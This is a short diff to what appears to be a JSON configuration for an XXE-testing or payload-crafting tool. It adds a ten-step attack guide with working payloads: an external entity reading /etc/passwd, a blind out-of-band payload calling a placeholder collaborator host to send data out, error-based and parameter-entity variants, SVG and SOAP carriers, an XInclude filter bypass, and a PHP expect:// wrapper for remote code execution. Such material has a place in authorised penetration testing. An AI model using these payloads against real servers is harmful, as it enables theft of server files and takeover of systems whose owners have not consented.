@@ -1,5 +1,17 @@
 {
   "category": "xxe",
+  "craft_guidance": [
+    "1. IDENTIFY PARSER: Java (Xerces, JAXP), PHP (libxml), .NET (XmlDocument), Python (lxml, ElementTree). Each has different default entity-resolution behavior.",
+    "2. CONFIRM XML PROCESSING: server accepts Content-Type: application/xml or text/xml. SOAP, SVG, DOCX, XLSX (zipped XML), RSS, OOXML are all carriers.",
+    "3. SIMPLE FILE READ: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>`. If entities resolved, file content reflected.",
+    "4. BLIND XXE: parser doesn't reflect — use OOB. `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://COLLAB/x.dtd'>%xxe;]>` with external DTD that exfiltrates via parameter entity. Replace COLLAB per Rule 9a.",
+    "5. ERROR-BASED XXE: parameter entity triggers error containing file content. Effective when server parses but suppresses entity expansion in body.",
+    "6. PARAMETER ENTITY (PE) FOR BLIND: many parsers permit PE in external DTD even when blocking PE in input.",
+    "7. SVG-XXE: SVG with DOCTYPE is XML-parsed by image libs (ImageMagick, librsvg). Upload + view as profile pic = file read.",
+    "8. SOAP / WSDL: insert ENTITY in <soap:Envelope> DOCTYPE. Older Java SOAP stacks vulnerable.",
+    "9. XINCLUDE: when DOCTYPE stripped, use `<xi:include xmlns:xi='http://www.w3.org/2001/XInclude' href='file:///etc/passwd' parse='text'/>`. Bypasses simple DTD filters.",
+    "10. PHP EXPECT: `expect://id` wrapper for RCE on systems with PHP expect ext. Rare but devastating."
+  ],
   "contexts": {
     "file_read": {
       "description": "XXE file read via external entity",
